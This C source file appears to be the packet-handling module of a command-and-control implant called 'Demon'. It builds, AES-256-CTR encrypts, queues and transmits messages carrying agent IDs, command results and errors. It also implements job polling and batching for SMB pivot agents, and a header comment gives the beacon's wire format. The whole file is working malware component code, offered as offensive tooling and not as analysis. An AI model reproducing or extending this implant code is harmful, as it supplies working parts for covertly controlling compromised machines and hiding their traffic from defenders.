/* Import Core Headers */
#include <Core/Package.h>
#include <Core/MiniStd.h>
#include <Core/Command.h>
#include <Core/Transport.h>

/* Import Crypto Header (enable CTR Mode) */
#define CTR    1
#define AES256 1
#include <Crypt/AesCrypt.h>

VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )
{
    Buffer[ 7 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 6 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 5 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 4 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 3 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 2 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 1 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 0 ] = Value & 0xFF;
}

VOID Int32ToBuffer(
    OUT PUCHAR Buffer,
    IN  UINT32 Size
) {
    ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
    ( Buffer ) [ 1 ] = ( Size >> 16 ) & 0xFF;
    ( Buffer ) [ 2 ] = ( Size >> 8  ) & 0xFF;
    ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
}

VOID PackageAddInt32(
    IN OUT PPACKAGE Package,
    IN     UINT32   Data
) {
    if ( ! Package ) {
        return;
    }

    Package->Buffer = Instance.Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT32 ),
            LMEM_MOVEABLE
    );

    Int32ToBuffer( Package->Buffer + Package->Length, Data );

    Package->Length += sizeof( UINT32 );
}

VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
{
    if ( ! Package ) {
        return;
    }

    Package->Buffer = Instance.Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT64 ),
            LMEM_MOVEABLE
    );

    Int64ToBuffer( Package->Buffer + Package->Length, dataInt );

    Package->Length += sizeof( UINT64 );
}

VOID PackageAddPtr( PPACKAGE Package, PVOID pointer )
{
    PackageAddInt64( Package, ( UINT64 ) pointer );
}

VOID PackageAddPad( PPACKAGE Package, PCHAR Data, SIZE_T Size )
{
    if ( ! Package )
        return;

    Package->Buffer = Instance.Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + Size,
            LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    MemCopy( Package->Buffer + ( Package->Length ), Data, Size );

    Package->Length += Size;
}

VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )
{
    if ( ! Package ) {
        return;
    }

    PackageAddInt32( Package, Size );

    if ( Size )
    {
        Package->Buffer = Instance.Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + Size,
            LMEM_MOVEABLE | LMEM_ZEROINIT
        );

        MemCopy( Package->Buffer + Package->Length, Data, Size );

        Package->Length += Size;
    }
}

VOID PackageAddString( PPACKAGE package, PCHAR data )
{
    PackageAddBytes( package, (PBYTE) data, StringLengthA( data ) );
}

VOID PackageAddWString( PPACKAGE package, PWCHAR data )
{
    PackageAddBytes( package, (PBYTE) data, StringLengthW( data ) * 2 );
}

PPACKAGE PackageCreate( UINT32 CommandID )
{
    PPACKAGE Package = NULL;

    Package            = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
    Package->Buffer    = Instance.Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
    Package->Length    = 0;
    Package->RequestID = Instance.CurrentRequestID;
    Package->CommandID = CommandID;
    Package->Encrypt   = TRUE;
    Package->Destroy   = TRUE;
    Package->Included  = FALSE;
    Package->Next      = NULL;

    return Package;
}

PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )
{
    PPACKAGE Package = PackageCreate( CommandID );

    PackageAddInt32( Package, 0 ); // package length
    PackageAddInt32( Package, DEMON_MAGIC_VALUE );
    PackageAddInt32( Package, Instance.Session.AgentID );
    PackageAddInt32( Package, Package->CommandID );
    PackageAddInt32( Package, Package->RequestID );

    return Package;
}

PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID )
{
    PPACKAGE Package = PackageCreate( CommandID );

    Package->RequestID = RequestID;

    return Package;
}

VOID PackageDestroy(
    IN PPACKAGE Package
) {
    PPACKAGE Pkg = Instance.Packages;

    if ( Package )
    {
        // make sure the package is not on the Instance.Packages list, avoid UAF
        while ( Pkg )
        {
            if ( Package == Pkg )
            {
                PUTS_DONT_SEND( "Package can't be destroyed, is on Instance.Packages list" )
                return;
            }

            Pkg = Pkg->Next;
        }

        if ( Package->Buffer )
        {
            MemSet( Package->Buffer, 0, Package->Length );
            Instance.Win32.LocalFree( Package->Buffer );
            Package->Buffer = NULL;
        }

        MemSet( Package, 0, sizeof( PACKAGE ) );
        Instance.Win32.LocalFree( Package );
        Package = NULL;
    }
}

// used to send the demon's metadata
BOOL PackageTransmitNow(
    IN OUT PPACKAGE Package,
    OUT    PVOID*   Response,
    OUT    PSIZE_T  Size
) {
    AESCTX AesCtx  = { 0 };
    BOOL   Success = FALSE;
    UINT32 Padding = 0;

    if ( Package )
    {
        if ( ! Package->Buffer ) {
            PUTS_DONT_SEND( "Package->Buffer is empty" )
            return FALSE;
        }

        // writes package length to buffer
        Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );

        if ( Package->Encrypt )
        {
            Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );

            /* only add these on init or key exchange */
            if ( Package->CommandID == DEMON_INITIALIZE ) {
                Padding += 32 + 16;
            }

            AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
        }

        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
            Success = TRUE;
        } else {
            PUTS_DONT_SEND("TransportSend failed!")
        }

        if ( Package->Destroy ) {
            PackageDestroy( Package ); Package = NULL;
        } else if ( Package->Encrypt ) {
            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
        }
    } else {
        PUTS_DONT_SEND( "Package is empty" )
        Success = FALSE;
    }

    return Success;
}

// don't transmit right away, simply store the package. Will be sent when PackageTransmitAll is called
VOID PackageTransmit(
    IN PPACKAGE Package
) {
    PPACKAGE List = NULL;

    if ( ! Package ) {
        return;
    }
        
    if ( ! Instance.Packages )
    {
        Instance.Packages = Package;
    }
    else
    {
        // add the new package to the end of the list (to preserve the order)
        List = Instance.Packages;
        while ( List->Next ) {
            List = List->Next;
        }
        List->Next = Package;
    }
}

// transmit all stored packages in a single request
BOOL PackageTransmitAll(
    OUT    PVOID*   Response,
    OUT    PSIZE_T  Size
) {
    AESCTX   AesCtx  = { 0 };
    BOOL     Success = FALSE;
    UINT32   Padding = 0;
    PPACKAGE Package = NULL;
    PPACKAGE Pkg     = Instance.Packages;
    PPACKAGE Entry   = NULL;
    PPACKAGE Prev    = NULL;

#if TRANSPORT_SMB
    // SMB pivots don't need to send DEMON_COMMAND_GET_JOB
    // so if we don't having nothing to send, simply exit
    if ( ! Instance.Packages )
        return TRUE;
#endif

    Package = PackageCreateWithMetaData( DEMON_COMMAND_GET_JOB );

    // add all the packages we want to send to the main package
    while ( Pkg )
    {
        PackageAddInt32( Package, Pkg->CommandID );
        PackageAddInt32( Package, Pkg->RequestID );
        PackageAddBytes( Package, Pkg->Buffer, Pkg->Length );
        Pkg->Included = TRUE;

        // make sure we don't send a package larger than DEMON_MAX_REQUEST_LENGTH
        if ( Package->Length > DEMON_MAX_REQUEST_LENGTH )
            break;

        Pkg = Pkg->Next;
    }

    // writes package length to buffer
    Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );

    /*
     *  Header:
     *  [ SIZE         ] 4 bytes
     *  [ Magic Value  ] 4 bytes
     *  [ Agent ID     ] 4 bytes
     *  [ COMMAND ID   ] 4 bytes
     *  [ Request ID   ] 4 bytes
    */
    Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );

    // encrypt the package
    AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
    AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );

    // send it
    if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
        Success = TRUE;
    } else {
        PUTS_DONT_SEND("TransportSend failed!")
    }

    // decrypt the package
    AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );

    Entry = Instance.Packages;
    Prev  = NULL;

    if ( Success )
    {
        // the request worked, remove all the packages that were included

        while ( Entry )
        {
            if ( Entry->Included )
            {
                // is this the first entry?
                if ( Entry == Instance.Packages )
                {
                    // update the start of the list
                    Instance.Packages = Entry->Next;

                    // remove the entry if requried
                    if ( Entry->Destroy ) {
                        PackageDestroy( Entry ); Entry = NULL;
                    }

                    Entry = Instance.Packages;
                    Prev  = NULL;
                }
                else
                {
                    if ( Prev )
                    {
                        // remove the entry from the list
                        Prev->Next = Entry->Next;

                        // remove the entry if requried
                        if ( Entry->Destroy ) {
                            PackageDestroy( Entry ); Entry = NULL;
                        }

                        Entry = Prev->Next;
                    }
                    else
                    {
                        // wut? this shouldn't happen
                        PUTS_DONT_SEND( "Failed to cleanup packages list" )
                    }
                }
            }
            else
            {
                Prev  = Entry;
                Entry = Entry->Next;
            }
        }
    }
    else
    {
        // the request failed, mark all packages as not included for next time
        while ( Entry )
        {
            Entry->Included = FALSE;
            Entry           = Entry->Next;
        }
    }

    PackageDestroy( Package ); Package = NULL;

    return Success;
}

VOID PackageTransmitError(
    IN UINT32 ID,
    IN UINT32 ErrorCode
) {
    PPACKAGE Package = NULL;

    PRINTF_DONT_SEND( "Transmit Error: %d\n", ErrorCode );

    Package = PackageCreate( DEMON_ERROR );

    PackageAddInt32( Package, ID );
    PackageAddInt32( Package, ErrorCode );
    PackageTransmit( Package );
}

